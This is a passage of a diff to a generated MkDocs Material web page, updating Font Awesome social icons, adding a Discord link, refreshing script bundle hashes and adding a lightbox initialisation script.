-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8l164.9-188.5L26.8 48h145.6l100.5 132.9zm-24.8 373.8h39.1L151.1 88h-42z"/></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M357.2 48h70.6L273.6 224.2 455 464H313L201.7 318.6 74.5 464H3.8l164.9-188.5L-5.2 48h145.6l100.5 132.9zm-24.8 373.8h39.1L119.1 88h-42z"/></svg>
     </a>
   
     
@@ -1895,7 +2378,7 @@
       
     
     <a href="https://github.com/tomfieber" target="_blank" rel="noopener" title="github.com" class="md-social__link">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
     </a>
   
     
@@ -1906,7 +2389,18 @@
       
     
     <a href="https://www.linkedin.com/in/thomasfieber" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discord.gg/XvAFFw6A" target="_blank" rel="noopener" title="discord.gg" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M492.5 69.8c-.2-.3-.4-.6-.8-.7-38.1-17.5-78.4-30-119.7-37.1-.4-.1-.8 0-1.1.1s-.6.4-.8.8c-5.5 9.9-10.5 20.2-14.9 30.6-44.6-6.8-89.9-6.8-134.4 0-4.5-10.5-9.5-20.7-15.1-30.6-.2-.3-.5-.6-.8-.8s-.7-.2-1.1-.2C162.5 39 122.2 51.5 84.1 69c-.3.1-.6.4-.8.7C7.1 183.5-13.8 294.6-3.6 404.2c0 .3.1.5.2.8s.3.4.5.6c44.4 32.9 94 58 146.8 74.2.4.1.8.1 1.1 0s.7-.4.9-.7c11.3-15.4 21.4-31.8 30-48.8.1-.2.2-.5.2-.8s0-.5-.1-.8-.2-.5-.4-.6-.4-.3-.7-.4c-15.8-6.1-31.2-13.4-45.9-21.9-.3-.2-.5-.4-.7-.6s-.3-.6-.3-.9 0-.6.2-.9.3-.5.6-.7c3.1-2.3 6.2-4.7 9.1-7.1.3-.2.6-.4.9-.4s.7 0 1 .1c96.2 43.9 200.4 43.9 295.5 0 .3-.1.7-.2 1-.2s.7.2.9.4c2.9 2.4 6 4.9 9.1 7.2.2.2.4.4.6.7s.2.6.2.9-.1.6-.3.9-.4.5-.6.6c-14.7 8.6-30 15.9-45.9 21.8-.2.1-.5.2-.7.4s-.3.4-.4.7-.1.5-.1.8.1.5.2.8c8.8 17 18.8 33.3 30 48.8.2.3.6.6.9.7s.8.1 1.1 0c52.9-16.2 102.6-41.3 147.1-74.2.2-.2.4-.4.5-.6s.2-.5.2-.8c12.3-126.8-20.5-236.9-86.9-334.5zm-302 267.7c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.4 59.2-52.8 59.2m195.4 0c-29 0-52.8-26.6-52.8-59.2s23.4-59.2 52.8-59.2c29.7 0 53.3 26.8 52.8 59.2 0 32.7-23.2 59.2-52.8 59.2"/></svg>
     </a>
   
 </div>
@@ -1921,15 +2415,21 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "search.suggestions", "search.highlight", "navigation.footer", "content.code.copy", "content.code.annotate", "content.code.tabs"], "search": "../../../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      <script src="../../../../assets/javascripts/bundle.50899def.min.js"></script>
       
         <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
       
         <script src="../../../../javascripts/tablesort.js"></script>
       
+        <script src="../../../../javascripts/extra.js"></script>
+      
     
-  </body>
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
 </html>
